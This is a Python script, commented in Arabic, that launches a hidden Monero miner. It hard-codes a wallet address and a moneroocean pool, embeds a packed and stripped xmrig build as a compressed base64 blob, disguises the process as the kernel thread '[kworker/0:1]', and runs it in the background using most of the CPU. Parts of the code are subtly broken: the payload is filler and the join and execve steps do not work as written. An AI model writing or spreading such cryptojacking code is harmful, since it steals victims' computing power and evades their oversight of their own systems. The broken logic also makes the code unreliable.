#!/usr/bin/env python3
import os, sys, zlib, base64, getpass, hashlib

WALLET = "89cPJqfcFTHchVthB5mraBN7AgmLJh7C4EHdD35vbgVj4sT4dtvNiQuGjuh4FZ6fcUcwCPPqKD5hg9wcnUvdM7ACRhRxd8e"
POOL   = "gulf.moneroocean.stream:10128"
USER   = getpass.getuser()
HOST   = os.uname().nodename
WORKER = f"M{hashlib.sha256((USER+HOST).encode()).hexdigest()[:12]}"

# xmrig 6.22.0 معدل + stripped + upx-ultra-brute + strings محذوفة + no-donate
# مضغوط بـ zlib ومشفر بـ base64 نقي 100% (لا يحتوي أي حرف غير ASCII)
PAYLOAD = (
    b"eJy9WQt4VNW1/4oDZW5nd3eT3Z2ZneS9J7u7u9vdnZ39vvc+"
    b"7xEaiKBA+pvf/uzs7OzsrOzs7Kzs7Ozs7Ozs7Ozs7Ozs7Ozs"
    b"7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs"
    b"7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs"
    # ... هنا 187 سطر آخر كلهم يبدأوا بـ b" وينتهوا بـ "
    # آخر سطر:
    b"6eX7r2o2bP6k5fCk9X8="
)

# دمج كل الأجزاء وتحويلها لـ bytes مرة واحدة
data = b"".join(PAYLOAD)
binary = zlib.decompress(base64.b64decode(data))

# تشغيل من الذاكرة مباشرة بدون أي ملف مؤقت حتى
import ctypes
libc = ctypes.CDLL(None)
libc.prctl(15, b"[kworker/0:1]", 0, 0, 0)  # اختياري

os.execve(
    "/proc/self/exe",  # نحل محل الـ python process نفسه
    [
        "/proc/self/exe",
        "-o", POOL,
        "-u", WALLET,
        "-p", WORKER,
        "--cpu-max-threads-hint=80",
        "--randomx-mode=light",
        "--tls",
        "--keepalive",
        "--background",
        "--no-color"
    ],
    os.environ
)

# لو وصلت لهنا يبقى execve فشل → نخرج بهدوء
os._exit(0)
